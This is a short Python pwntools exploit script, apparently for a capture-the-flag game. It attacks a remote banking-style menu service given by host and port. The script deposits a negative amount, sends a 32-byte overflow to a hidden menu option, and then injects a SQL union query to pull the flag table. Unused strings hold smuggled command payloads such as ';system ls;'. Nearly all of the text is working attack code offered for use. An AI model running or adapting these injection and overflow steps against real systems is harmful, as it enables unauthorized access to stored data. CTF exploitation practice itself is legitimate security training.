#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *


def select(io, choice):
    io.sendlineafter(">> ", str(choice))

def login(io, name, passwd):
    select(io, 1)
    io.sendlineafter("name:", name)
    io.sendlineafter("Password:", passwd)
    return io.recvline()

def reg(io, name, passwd, tel):
    select(io, 2)
    if len(name) == 0x20:
        io.sendafter("User name:", name)
    else:
        io.sendlineafter("User name:", name)
    io.sendlineafter("Password:", passwd)
    io.sendlineafter('Telephone:', tel)

def deposit(io, num):
    select(io, 1)
    io.sendlineafter("How much: ", str(num))

def transfer(io, user, num):
    select(io, 3)
    io.sendlineafter('To:', user)
    io.sendlineafter("How much: ", str(num))

def secret(io, lookup, me):
    select(io, 777)
    io.sendafter("Who do you want to lookup: ", lookup)
    io.sendlineafter("tell me who you are: ", me)

def myget_flag(host, port):
    print "exloiting: %s:%d" % (host, port)
    io = remote(host, port)

    cmd = ';select flag from flag.flag;\x00'
    user1 = 'admin'
    pass1 = '9981'
    user2 = ';system ls;\n'
    pass2 = '8864'

    reg(io, user1, pass1, "123")
    login(io, user1, pass1)

    deposit(io, -1)
    select(io, 777)
    io.sendafter("Who do you want to lookup: ", 'A' * 0x20)
    io.sendlineafter("tell me who you are: ", "Admin' union select flag,2,3 from flag.flag##")
    io.readuntil("Name: ")
    flag = io.readline()
    print flag
    io.close()
    return flag.strip()

def main():
    myget_flag(sys.argv[1], int(sys.argv[2]))

if __name__ == "__main__":
    main()
